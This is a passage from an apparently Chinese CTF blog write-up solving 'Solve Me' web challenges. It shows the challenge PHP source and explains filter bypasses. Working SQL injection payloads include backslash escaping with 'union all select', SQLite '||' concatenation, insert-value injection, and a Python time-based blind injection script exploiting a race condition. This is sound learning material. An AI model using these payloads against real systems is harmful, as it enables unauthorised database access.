class="string">"3"</span>,<span class="string">"101"</span>,<span class="string">"100"</span>,<span class="string">"100"</span>,<span class="string">"98"</span>,<span class="string">"98"</span>,<span class="string">"57"</span>,<span class="string">"4"</span>+<span class="string">"9"</span>,<span class="string">"125"</span>,<span class="string">"34"</span>,<span class="string">"4"</span>+<span class="string">"1"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"1"</span>+<span class="string">"2"</span>+<span class="string">"3"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"9"</span>,<span class="string">"97"</span>,<span class="string">"108"</span>,<span class="string">"101"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"4"</span>,<span class="string">"116"</span>,<span class="string">"40"</span>,<span class="string">"34"</span>,<span class="string">"98"</span>,<span class="string">"105"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"3"</span>,<span class="string">"111"</span>,<span class="string">"34"</span>,<span class="string">"4"</span>+<span class="string">"1"</span>,<span class="string">"5"</span>+<span class="string">"9"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"125"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"101"</span>,<span class="string">"108"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"5"</span>,<span class="string">"101"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"1"</span>+<span class="string">"2"</span>+<span class="string">"3"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"9"</span>,<span class="string">"97"</span>,<span class="string">"108"</span>,<span class="string">"101"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"4"</span>,<span class="string">"116"</span>,<span class="string">"40"</span>,<span class="string">"34"</span>,<span class="string">"119"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"4"</span>,<span class="string">"111"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"3"</span>,<span class="string">"34"</span>,<span class="string">"4"</span>+<span class="string">"1"</span>,<span class="string">"5"</span>+<span class="string">"9"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"125"</span></span><br><span class="line">]</span><br><span class="line">s = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dit:</span><br><span class="line">s = s + chr(int(i))</span><br></pre></td></tr></table></figure><p>得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// good job!</span><br><span class="line"></span><br><span class="line">let flag = prompt(&quot;what is the flag?&quot;);</span><br><span class="line"></span><br><span class="line">if (flag === &quot;&quot;) &#123;</span><br><span class="line"></span><br><span class="line">alert(&quot;plnput&quot;);</span><br><span class="line"></span><br><span class="line">&#125; else if (flag === &quot;flag&#123;21df4ad3ce31af845cf9cd6a5eddbb91&#125;&quot;) &#123;</span><br><span class="line"></span><br><span class="line">alert(&quot;bingo&quot;);</span><br><span class="line"></span><br><span class="line">&#125; else &#123;</span><br><span class="line"></span><br><span class="line">alert(&quot;wrong&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="AntiSQL"><a href="#AntiSQL" class="headerlink" title="AntiSQL"></a>AntiSQL</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// It's 'Anti SQLi' problem of 'Solve Me'.</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>; </span><br><span class="line"></span><br><span class="line">    $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">    $pw = $_GET[<span class="string">'pw'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($id, $pw))&#123;</span><br><span class="line">        preg_match(</span><br><span class="line">            <span class="string">'/\.|\`|"|\'|\\|\xA0|\x0B|0x0C|\t|\r|\n|\0|'</span>.</span><br><span class="line">            <span class="string">'=|&lt;|&gt;|\(|\)|@@|\|\||&amp;&amp;|#|\/\*.*\*\/|--[\s\xA0]|'</span>.</span><br><span class="line">            <span class="string">'0x[0-9a-f]+|0b[01]+|x\'[0-9a-f]+\'|b\'[01]+\'|'</span>.</span><br><span class="line">            <span class="string">'[\s\xA0\'"]+(as|or|and|r*like|regexp)[\s\xA0\'"]+|'</span>.</span><br><span class="line">            <span class="string">'union[\s\xA0]+select|[\s\xA0](where|having)|'</span>.</span><br><span class="line">            <span class="string">'[\s\xA0](group|order)[\s\xA0]+by|limit[\s\xA0]+\d|'</span>.</span><br><span class="line">            <span class="string">'information_schema|procedure\s+analyse\s*/is'</span>,</span><br><span class="line">            $id.<span class="string">','</span>.$pw</span><br><span class="line">        ) <span class="keyword">and</span> <span class="keyword">die</span>(<span class="string">'Hack detected'</span>);</span><br><span class="line"></span><br><span class="line">        $con = mysqli_connect($sql_host, $sql_username, $sql_password, $sql_dbname)</span><br><span class="line">            <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'SQL server down'</span>);</span><br><span class="line"></span><br><span class="line">        $result = mysqli_fetch_array(</span><br><span class="line">            mysqli_query(</span><br><span class="line">                $con, </span><br><span class="line">                <span class="string">"SELECT * FROM `antisqli` WHERE `id`='&#123;$id&#125;' AND `pw`=md5('&#123;$pw&#125;');"</span></span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">        mysqli_close($con);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($result))&#123;</span><br><span class="line">            <span class="keyword">if</span>($result[<span class="string">'no'</span>] === <span class="string">'31337'</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> $flag;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'Hello, '</span>, $result[<span class="string">'id'</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Login failed'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>简单说一下这段代码的意思，就是传进两个参数，然后进行过滤，然后进行数据库的查找，查找的结果里面如果含有<code>31337</code>的就可以成功输出flag了</p><p>这段代码里面有一个很吓唬人的过滤准则，但是其实里面存在小漏洞<br>    首先过滤了单引号啥的，注入一个单引号行不通，但是我们可以去掉一个单引号，如果要正则匹配\的话，正确的写法应该是 <code>|\\\\|</code>也就是说，反斜杠没有被过滤。这样我们可以注入反斜杠把id的第二个单引号给搞掉。这样一来就可以注入了<br>第二点就是他那个<code>union[\s\xA0]+select</code>把所有非空字符都过滤掉了，所以说直接上<code>union select</code>是不太行的,但是我们可以用<code>union all select</code>去绕过<br>然后是注释的问题，因为正则里面明确把<code>#</code>，还有<code>--加上空字符</code>过滤掉了，那我们用<code>--%1a</code>注释也是可以的<br>还有因为这里<code>order by</code> 也过滤了，只能手动去测试列数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=\&amp;pw=union all select 1 from antisqli --%1A</span><br></pre></td></tr></table></figure><p>发现回显的是Login failed说明列数不对，再继续试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=\&amp;pw=union all select 1,2 from antisqli --%1A</span><br></pre></td></tr></table></figure><p>还是login failed,再继续试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=\&amp;pw=union all select 1,2,3 from antisqli --%1A</span><br></pre></td></tr></table></figure><p>这时候回显Hello了，代码逻辑跳到第一个if条件里面，说明有3列<br>然后我们直接上payload<br><code>?id=\&amp;pw=union all select 31337,2,3 from antisqli --%1A</code> 直接出flag<br>这里的语句在数据库里大概是这样的</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="string">`antisqli`</span> <span class="keyword">WHERE</span> <span class="string">`id`</span>=<span class="string">' \' and `pw` = md5('</span> <span class="keyword">union</span> all <span class="keyword">select</span> .... <span class="keyword">from</span> ... <span class="comment">--%1a</span></span><br></pre></td></tr></table></figure><p>重点是union all前面的语句为空，直接执行后面的语句，这太灵活了，又学到了</p><h3 id="Name-check"><a href="#Name-check" class="headerlink" title="Name check"></a>Name check</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   error_reporting(<span class="number">0</span>);</span><br><span class="line">   <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>; </span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">       $name = $_GET[<span class="string">'name'</span>];</span><br><span class="line">       <span class="keyword">if</span>(preg_match(<span class="string">"/admin|--|;|\(\)|\/\*|\\0/i"</span>, $name))&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">'Not allowed input'</span>;</span><br><span class="line">           <span class="keyword">goto</span> quit;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $sql = <span class="keyword">new</span> SQLite3(<span class="string">'name_check.db'</span>, SQLITE3_OPEN_READWRITE);</span><br><span class="line">       $res = $sql-&gt;query(<span class="string">"</span></span><br><span class="line"><span class="string">           SELECT </span></span><br><span class="line"><span class="string">           MAX('0','1','&#123;$name&#125;') LIKE 'a%', </span></span><br><span class="line"><span class="string">           INSTR('&#123;$name&#125;','d')&gt;0, </span></span><br><span class="line"><span class="string">           MIN('&#123;$name&#125;','b','c') LIKE '__m__', </span></span><br><span class="line"><span class="string">           SUBSTR('&#123;$name&#125;',-2)='in'</span></span><br><span class="line"><span class="string">       ;"</span>);</span><br><span class="line">       <span class="keyword">if</span>($res === <span class="keyword">false</span>)&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">'Database error'</span>;</span><br><span class="line">           <span class="keyword">goto</span> quit;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $row = $res-&gt;fetchArray(SQLITE3_NUM);</span><br><span class="line">       <span class="keyword">if</span>(</span><br><span class="line">           $row[<span class="number">0</span>] + $row[<span class="number">1</span>] + $row[<span class="number">2</span>] + $row[<span class="number">3</span>] !== <span class="number">4</span> ||</span><br><span class="line">           array_sum($row) !== <span class="number">4</span> </span><br><span class="line">       )&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">'Auth failed'</span>;</span><br><span class="line">           <span class="keyword">goto</span> quit;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">echo</span> $flag;</span><br><span class="line"></span><br><span class="line">   quit:</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>我没玩过sqlite，但是感觉这里一定要满足admin这个东西，因为query函数后面的东西，但是这里的过滤是正整一个词的过滤，但是我们可以用sqlite的连接词<code>||</code>去实现绕过，但是对于mysql字符串的拼接只能用<code>concat</code>函数去拼接<br>所以最后的payload：<code>ad&#39;||&#39;min</code></p><h3 id="I-am-slowly"><a href="#I-am-slowly" class="headerlink" title="I am slowly"></a>I am slowly</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// It's 'I am slowly' problem of 'Solve Me'.</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>; </span><br><span class="line"></span><br><span class="line">    $table = <span class="string">'iamslowly_'</span>.ip2long($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    $answer = $_GET[<span class="string">'answer'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($answer))&#123;</span><br><span class="line">        $con = mysqli_connect($sql_host, $sql_username, $sql_password, $sql_dbname)</span><br><span class="line">            <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'SQL server down'</span>);</span><br><span class="line"></span><br><span class="line">        $result = mysqli_fetch_array(</span><br><span class="line">            mysqli_query($con, <span class="string">"SELECT `count` FROM `&#123;$table&#125;`;"</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($result))&#123;</span><br><span class="line">            mysqli_query($con, <span class="string">"CREATE TABLE IF NOT EXISTS `&#123;$table&#125;` (`answer` char(32) NOT NULL, `count` int(4) NOT NULL);"</span>);</span><br><span class="line">            $new_answer = md5(sha1(<span class="string">'iamslowly_'</span>.mt_rand().<span class="string">'_'</span>.mt_rand().<span class="string">'_'</span>.mt_rand()));</span><br><span class="line">            mysqli_query($con, <span class="string">"INSERT INTO `&#123;$table&#125;` (`answer`,`count`) VALUES ('&#123;$new_answer&#125;',1);"</span>);</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">elseif</span>($result[<span class="string">'count'</span>] === <span class="string">'12'</span>)&#123;</span><br><span class="line">            mysqli_query($con, <span class="string">"DROP TABLE `&#123;$table&#125;`;"</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Game over'</span>;</span><br><span class="line">            <span class="keyword">goto</span> quit;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $randtime = mt_rand(<span class="number">1</span>, <span class="number">10</span>);</span><br><span class="line">        $result = mysqli_fetch_array(</span><br><span class="line">            mysqli_query($con, <span class="string">"SELECT * FROM `&#123;$table&#125;` WHERE sleep(&#123;$randtime&#125;) OR `answer`='&#123;$answer&#125;';"</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($result) &amp;&amp; $result[<span class="string">'answer'</span>] === $answer)&#123;</span><br><span class="line">            mysqli_query($con, <span class="string">"DROP TABLE `&#123;$table&#125;`;"</span>);</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            mysqli_query($con, <span class="string">"UPDATE `&#123;$table&#125;` SET `count`=`count`+1;"</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Go fast'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">quit:</span><br><span class="line">        mysqli_close($con);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这个题目也是很骚，我第一次遇见这一种类型的题目，利用来了php以及mysql之间的延时关系去绕过那一个可恶的12.。。<br>但是执行过程过于缓慢啊，主要是两个延时太过耗时<br>概述一下这题目的意思传参进去之后，如果没有对应的表就根据你的ip创建一个表，并且这个表里面含有一个名为COUNT的字段，初始值为1，后面就一直往这里面的COUNT+1，如果到12的话就会把表删掉重新再新建一个表，所以关键是他的逻辑顺序出了错误。</p><p><code>判断count的值–&gt;执行SQL语句–&gt;加count值</code></p><p>这个逻辑在执行语句的时候有问题，当count=11的时候，我们执行一个sleep()时间很长的语句，该请求就会长时间停在 执行SQL语句 流程中，如果此时我们再发起一次正常请求，判断count值还是11，执行完SQL语句之后count+1=12，再当上一条SQL语句执行完毕后count再加1等于13，于是之后就可以无限制提交请求了，然后在利用盲注来获得answer，这确实骚气<br>小脚本，最好还是把header啥的都弄进去，毕竟是靠ip建表的，这个东西跑得很慢不值得，而且一直都跑的错的答案，QAQ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">keys = <span class="string">'0123456789abcdef'</span></span><br><span class="line">header = &#123;</span><br><span class="line"><span class="string">"Host"</span>: <span class="string">"iamslowly.thinkout.rf.gd"</span>,</span><br><span class="line">    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0"</span>,</span><br><span class="line">     <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span>,</span><br><span class="line">     <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span>,</span><br><span class="line">      <span class="string">"Accept-Encoding"</span>:<span class="string">"gzip, deflate"</span>,</span><br><span class="line">      <span class="string">"Referer"</span>: <span class="string">"http://iamslowly.thinkout.rf.gd/"</span>,</span><br><span class="line"><span class="string">"Cookie"</span>: <span class="string">"__test=4e8126e93f7b5a4448c7e3c1f0b7853e"</span>,</span><br><span class="line">    <span class="string">"Upgrade-Insecure-Requests"</span>:<span class="string">"1"</span>,</span><br><span class="line">      <span class="string">"Cache-Control"</span>: <span class="string">"max-age=0"</span></span><br><span class="line">&#125;</span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> keys:</span><br><span class="line">        url = <span class="string">"http://iamslowly.thinkout.rf.gd/?i=1&amp;answer=' or if((answer like '&#123;&#125;%'),sleep(30),2)%23"</span>.format(payload + j)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            content = requests.get(url,headers=header,timeout=<span class="number">29</span>).content</span><br><span class="line">            <span class="comment">#print(content[:10])</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">'[+]Waiting!'</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            payload += j</span><br><span class="line">            print(payload)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="Cheap-Lottery"><a href="#Cheap-Lottery" class="headerlink" title="Cheap Lottery"></a>Cheap Lottery</h3><p>这个题目一开始用扫描器扫一下发现里面存在robots.txt打开发现</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /backup/</span><br></pre></td></tr></table></figure><p>进去backup发现几个文件</p><p>一个数据库文件，还有一份源码</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`lottery`</span> (</span><br><span class="line">  <span class="string">`name`</span> <span class="built_in">char</span>(<span class="number">30</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`time`</span> <span class="built_in">int</span>(<span class="number">4</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`nums`</span> <span class="built_in">char</span>(<span class="number">30</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span></span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> <span class="string">`lottery`</span></span><br><span class="line">  <span class="keyword">ADD</span> <span class="keyword">UNIQUE</span> <span class="keyword">KEY</span> <span class="string">`name`</span> (<span class="string">`name`</span>);</span><br></pre></td></tr></table></figure><p>作为菜鸟感觉是SQL注入，但无从下手，知道发现原来方方土学长早就写过这题的题解<a href="https://www.anquanke.com/post/id/101939" target="_blank" rel="noopener">https://www.anquanke.com/post/id/101939</a><br>这波骚操作还是6，运用了字符集去绕过</p><p>而且p神也发过类似的文章(tql,QAQ)<br><a href="https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html</a></p><p>先讲一下这一段代码的意思，发现骆骆大佬早就做过这题而且流程图都画好了，我就直接贴图吧。。简单粗暴<br><img src="https://s1.ax1x.com/2018/04/03/CpBkLt.png" alt="这里写图片描述"></p><p>我们要利用的点就是这一段代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$nums = preg_replace(<span class="string">"/[a-zA-Z\[\]\=]/"</span>, <span class="string">""</span>, $url_query);</span><br><span class="line">$nums = strtr($nums, <span class="string">"&amp;"</span>, <span class="string">","</span>);</span><br><span class="line">$sql-&gt;query(<span class="string">"INSERT INTO `lottery`(`name`, `time`, `nums`) VALUE('&#123;$name&#125;', '&#123;$time&#125;', '&#123;$nums&#125;');"</span>);</span><br></pre></td></tr></table></figure><p>这段代码往数据库里面添加数据，只要我们往里面添加自己规定的值，然后再在另一处以同一ip地址进行访问(不购买)不就可以直接进到check模块了。。<br>意思就是这样<br>开始数据库里面是这样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO `lotter` (`name`,`time`,`nums`) VALUES (<span class="string">'guest_1.1.1.1'</span>,<span class="string">'time()'</span>,<span class="string">'69,69,69,69,69'</span>);</span><br></pre></td></tr></table></figure><p>后来我们构造，使数据库一开始就存在这样的值，我们下一次访问的时候就名正言顺的是买正确了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO `lotter` (`name`,`time`,`nums`) VALUES (<span class="string">'guest_1.1.1.1'</span>,<span class="string">'time()'</span>,<span class="string">'69'</span>),(<span class="string">'admin1.1.1.1'</span>,<span class="string">'$time'</span>,<span class="string">'69,69,69,69,69'</span>),(<span class="string">'guest_1.1.1.1'</span>,<span class="string">'$time'</span>,<span class="string">'69,69,69,69,69'</span>)<span class="comment">#',69,69,69,69');</span></span><br></pre></td></tr></table></figure><p>就可以名正言顺地使<code>bingo</code>这个值等于5，然后就输出flag了，也就是进入下面这段代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$bingo = <span class="number">0</span>;</span><br><span class="line">$nums_admin = explode(<span class="string">","</span>, $row_admin[<span class="string">'nums'</span>]); <span class="comment">// admin_*</span></span><br><span class="line">$nums_guest = explode(<span class="string">","</span>, $row_guest[<span class="string">'nums'</span>]); <span class="comment">// guest_*</span></span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">5</span>; ++$i)&#123;</span><br><span class="line"><span class="keyword">for</span>($k = <span class="number">0</span>; $k &lt; <span class="number">5</span>; ++$k)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($nums_admin[$i], $nums_guest[$k]) &amp;&amp; $nums_admin[$i] === $nums_guest[$k])&#123;</span><br><span class="line">++$bingo;</span><br><span class="line"><span class="keyword">unset</span>($nums_guest[$k]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unset</span>($nums_admin, $nums_guest);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($bingo == <span class="number">5</span>)&#123; <span class="comment">// correct all</span></span><br><span class="line">$msg = <span class="string">"Perfect! The flag is &lt;code&gt;&#123;$flag&#125;&lt;/code&gt;."</span>;</span><br></pre></td></tr></table></figure><p>但是我们要网关键的代码注入自己想要的东西，就必须得绕过字母这个步骤，这里开始及牵涉到字符集的问题了。</p><p>总结一下那几篇博客看到的点<br>MySQL中的字符集转换过程：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. MySQL Server收到请求时将请求数据从character_set_client转换为character_set_connection；</span><br><span class="line">2. 进行内部操作前将请求数据从character_set_connection转换为内部操作字符集，其确定方法如下：</span><br><span class="line">使用每个数据字段的CHARACTER SET设定值；</span><br><span class="line">• 若上述值不存在，则使用对应数据表的DEFAULT CHARACTER SET设定值(MySQL扩展，非SQL标准)；</span><br><span class="line">• 若上述值不存在，则使用对应数据库的DEFAULT CHARACTER SET设定值；</span><br><span class="line">• 